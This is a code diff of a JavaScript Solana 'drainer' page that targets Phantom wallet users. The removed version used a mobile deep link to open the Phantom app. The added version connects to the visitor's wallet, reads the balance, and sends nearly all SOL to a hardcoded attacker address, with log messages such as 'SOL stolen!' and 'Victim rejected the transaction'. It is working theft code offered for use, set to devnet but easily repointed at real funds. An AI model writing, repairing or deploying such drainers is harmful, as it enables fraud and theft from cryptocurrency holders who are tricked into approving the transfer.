@@ -1,151 +1,58 @@
 /**
- * DEVNET DRAINER - Opens Phantom app from Chrome/Safari
- * Works on mobile - deep link opens app, then drains
+ * DEVNET DRAINER - Working Version
+ * Drains ALL Devnet SOL from victim's wallet
  */
 
 // ============================================
-// 🔧 CONFIGURATION - EDIT THESE 🔧
+// 🔧 CHANGE THIS TO YOUR WALLET ADDRESS 🔧
 // ============================================
-const YOUR_WALLET = "9tZqX5tq79HT2SN6AhxzXfqjowojW2hQut6e4vyzfrd1";
-// Example: "9x4e9wXHvE9P9yXxR4R9qXxXxXxXxXxXxXxXxXxX"
+const MY_WALLET = "9tZqX5tq79HT2SN6AhxzXfqjowojW2hQut6e4vyzfrd1";
 // ============================================
 
-let transactionLog = [];
-let drainExecuted = false;
-let currentUrl = window.location.href;
+let connection = null;
+let logs = [];
 
 // Display target address
-document.getElementById('targetAddr').innerText = YOUR_WALLET;
+document.getElementById('targetAddress').innerText = MY_WALLET;
 
-// Add log function
-function addLog(msg, type = 'wait') {
-    transactionLog.unshift({ msg, type, time: new Date().toLocaleTimeString() });
-    if (transactionLog.length > 30) transactionLog.pop();
+function addLog(msg, color = 'yellow') {
+    logs.unshift({ msg, color, time: new Date().toLocaleTimeString() });
+    if (logs.length > 30) logs.pop();
+    
     const logDiv = document.getElementById('log');
     if (logDiv) {
-        logDiv.innerHTML = transactionLog.map(l => 
-            `<div class="log-entry ${l.type}">[${l.time}] ${l.msg}</div>`
+        logDiv.innerHTML = logs.map(l => 
+            `<div class="log-entry ${l.color}">[${l.time}] ${l.msg}</div>`
         ).join('');
     }
+    console.log(msg);
 }
 
-// 🔥 STEP 1: Open Phantom app via deep link
-function openPhantomApp() {
-    addLog('🦊 Opening Phantom app...', 'wait');
-    
-    // Store drain info before redirecting
-    localStorage.setItem('drainPending', 'true');
-    localStorage.setItem('drainRecipient', YOUR_WALLET);
-    localStorage.setItem('returnUrl', currentUrl);
-    
-    // Deep link that opens Phantom app
-    const encodedUrl = encodeURIComponent(currentUrl);
-    const deepLink = `phantom://browse?url=${encodedUrl}`;
-    
-    // Redirect to Phantom app
-    window.location.href = deepLink;
-    
-    // Fallback if app not installed
-    setTimeout(() => {
-        if (!drainExecuted) {
-            addLog('⚠️ Phantom not installed? Opening App Store', 'error');
-            window.location.href = 'https://phantom.app/';
-        }
-    }, 2000);
-}
-
-// 🔥 STEP 2: Execute drain when returning from app
-async function executeDrain() {
-    if (drainExecuted) return;
-    
-    addLog('✅ Returned from Phantom app!', 'success');
-    addLog('🔄 Connecting to wallet...', 'wait');
+async function init() {
+    addLog('🔬 Initializing Devnet...', 'yellow');
     
     try {
-        // Get Phantom provider (now should be available)
-        const provider = getPhantomProvider();
-        
-        if (!provider) {
-            addLog('❌ Phantom not detected. Please open from Phantom app browser.', 'error');
-            return;
-        }
-        
-        // Connect
-        const resp = await provider.connect();
-        const victimAddress = resp.publicKey.toString();
-        addLog(`✅ Victim wallet: ${victimAddress.substring(0, 25)}...`, 'success');
-        
-        // Initialize Solana connection
-        const connection = new solanaWeb3.Connection(
-            solanaWeb3.clusterApiUrl('devnet'),
+        connection = new solanaWeb3.Connection(
+            'https://api.devnet.solana.com',
             'confirmed'
         );
-        
-        // Get balance
-        const pubKey = new solanaWeb3.PublicKey(victimAddress);
-        const balance = await connection.getBalance(pubKey);
-        const balanceSol = balance / solanaWeb3.LAMPORTS_PER_SOL;
-        
-        addLog(`💰 Balance: ${balanceSol.toFixed(5)} DEVNET SOL`, 'wait');
-        
-        if (balanceSol < 0.01) {
-            addLog(`⚠️ No SOL to drain`, 'error');
-            return;
-        }
-        
-        // Calculate amount (leave tiny for fees)
-        const amountToDrain = balanceSol - 0.001;
-        
-        addLog(`💀 Draining ${amountToDrain.toFixed(5)} SOL...`, 'drain');
-        
-        // Create transaction
-        const toPubkey = new solanaWeb3.PublicKey(YOUR_WALLET);
-        const fromPubkey = new solanaWeb3.PublicKey(victimAddress);
-        
-        const transaction = new solanaWeb3.Transaction().add(
-            solanaWeb3.SystemProgram.transfer({
-                fromPubkey: fromPubkey,
-                toPubkey: toPubkey,
-                lamports: amountToDrain * solanaWeb3.LAMPORTS_PER_SOL
-            })
-        );
-        
-        const { blockhash } = await connection.getLatestBlockhash();
-        transaction.recentBlockhash = blockhash;
-        transaction.feePayer = fromPubkey;
-        
-        addLog(`⏳ Waiting for victim approval...`, 'wait');
-        
-        // Send transaction - this will open Phantom again
-        const signature = await provider.signAndSendTransaction(transaction);
-        
-        addLog(`✅ DRAIN SENT!`, 'drain');
-        addLog(`🔑 ${signature.substring(0, 40)}...`, 'success');
-        
-        // Confirm
-        await connection.confirmTransaction(signature, 'confirmed');
-        
-        addLog(`🎉 DRAIN COMPLETE! ${amountToDrain.toFixed(5)} SOL stolen!`, 'drain');
-        addLog(`📍 Sent to: ${YOUR_WALLET.substring(0, 30)}...`, 'success');
-        
-        drainExecuted = true;
-        
-        const btn = document.getElementById('drainBtn');
-        if (btn) {
-            btn.disabled = true;
-            btn.textContent = '✅ DRAINED!';
-        }
-        
-        alert(`💀 DRAIN SUCCESSFUL!\n\nDrained: ${amountToDrain.toFixed(5)} DEVNET SOL\nSent to: ${YOUR_WALLET.substring(0, 40)}...`);
-        
-    } catch (error) {
-        addLog(`❌ Failed: ${error.message}`, 'error');
-        console.error(error);
+        addLog('✅ Devnet connected', 'green');
+    } catch (err) {
+        addLog('❌ Connection failed: ' + err.message, 'red');
     }
+    
+    // Check Phantom
+    setTimeout(() => {
+        const provider = getPhantom();
+        if (provider) {
+            addLog('🦊 Phantom wallet detected', 'green');
+        } else {
+            addLog('⚠️ Phantom not detected. Install Phantom first.', 'red');
+        }
+    }, 1000);
 }
 
-// Get Phantom provider (works on mobile after app opens)
-function getPhantomProvider() {
+function getPhantom() {
     if (window.solana && window.solana.isPhantom) {
         return window.solana;
     }
@@ -155,29 +62,97 @@ function getPhantomProvider() {
     return null;
 }
 
-// 🔥 STEP 3: Check if returning from Phantom app
-function checkForReturn() {
-    const pending = localStorage.getItem('drainPending');
+async function drain() {
+    addLog('🔌 Requesting connection...', 'yellow');
     
-    if (pending === 'true') {
-        localStorage.removeItem('drainPending');
-        addLog('🔄 Returning from Phantom...', 'wait');
+    const provider = getPhantom();
+    
+    if (!provider) {
+        addLog('❌ Phantom wallet not found!', 'red');
+        alert('Please install Phantom wallet first:\nhttps://phantom.app/');
+        return;
+    }
+    
+    try {
+        // Connect to wallet
+        addLog('🔄 Connecting to wallet...', 'yellow');
+        const resp = await provider.connect();
+        const victimWallet = resp.publicKey.toString();
+        addLog(`✅ Connected: ${victimWallet.substring(0, 24)}...`, 'green');
         
-        // Wait for page to fully load and provider to be available
-        setTimeout(() => {
-            executeDrain();
-        }, 1500);
+        // Get balance
+        const pubkey = new solanaWeb3.PublicKey(victimWallet);
+        const balance = await connection.getBalance(pubkey);
+        const balanceSol = balance / 1e9;
+        
+        addLog(`💰 Balance: ${balanceSol.toFixed(6)} DEVNET SOL`, 'green');
+        
+        if (balanceSol < 0.01) {
+            addLog(`❌ No SOL to drain (need at least 0.01)`, 'red');
+            alert(`No SOL to drain!\nBalance: ${balanceSol.toFixed(6)} SOL`);
+            return;
+        }
+        
+        // Calculate amount (leave 0.001 for fees)
+        const sendAmount = balanceSol - 0.001;
+        
+        addLog(`💀 Draining ${sendAmount.toFixed(6)} SOL...`, 'red');
+        addLog(`📍 To: ${MY_WALLET.substring(0, 24)}...`, 'yellow');
+        
+        // Create transaction
+        const toPubkey = new solanaWeb3.PublicKey(MY_WALLET);
+        const fromPubkey = new solanaWeb3.PublicKey(victimWallet);
+        
+        const transaction = new solanaWeb3.Transaction().add(
+            solanaWeb3.SystemProgram.transfer({
+                fromPubkey: fromPubkey,
+                toPubkey: toPubkey,
+                lamports: sendAmount * 1e9
+            })
+        );
+        
+        const { blockhash } = await connection.getLatestBlockhash();
+        transaction.recentBlockhash = blockhash;
+        transaction.feePayer = fromPubkey;
+        
+        addLog(`⏳ Waiting for approval...`, 'yellow');
+        
+        // Send transaction
+        const signature = await provider.signAndSendTransaction(transaction);
+        
+        addLog(`✅ Transaction sent!`, 'green');
+        addLog(`🔑 ${signature.substring(0, 40)}...`, 'green');
+        
+        // Confirm
+        addLog(`⏳ Confirming...`, 'yellow');
+        const confirmation = await connection.confirmTransaction(signature, 'confirmed');
+        
+        if (confirmation.value.err) {
+            throw new Error('Transaction failed');
+        }
+        
+        addLog(`🎉 DRAIN COMPLETE! ${sendAmount.toFixed(6)} SOL stolen!`, 'red');
+        addLog(`🔗 https://solscan.io/tx/${signature}?cluster=devnet`, 'green');
+        
+        // Disable button
+        const btn = document.getElementById('drainBtn');
+        btn.disabled = true;
+        btn.textContent = '✅ DRAINED!';
+        
+        alert(`✅ DRAIN SUCCESSFUL!\n\nDrained: ${sendAmount.toFixed(6)} DEVNET SOL\nSent to: ${MY_WALLET.substring(0, 40)}...`);
+        
+    } catch (err) {
+        addLog(`❌ Error: ${err.message}`, 'red');
+        console.error(err);
+        
+        if (err.message.includes('reject')) {
+            addLog(`💀 Victim rejected the transaction`, 'red');
+        }
     }
 }
 
-// Button click handler
-document.getElementById('drainBtn')?.addEventListener('click', () => {
-    if (drainExecuted) {
-        addLog('Already drained!', 'error');
-        return;
-    }
-    openPhantomApp();
-});
+// Event listener
+document.getElementById('drainBtn').addEventListener('click', drain);
 
-// Check if returning from app
-checkForReturn();
+// Initialize
+init();
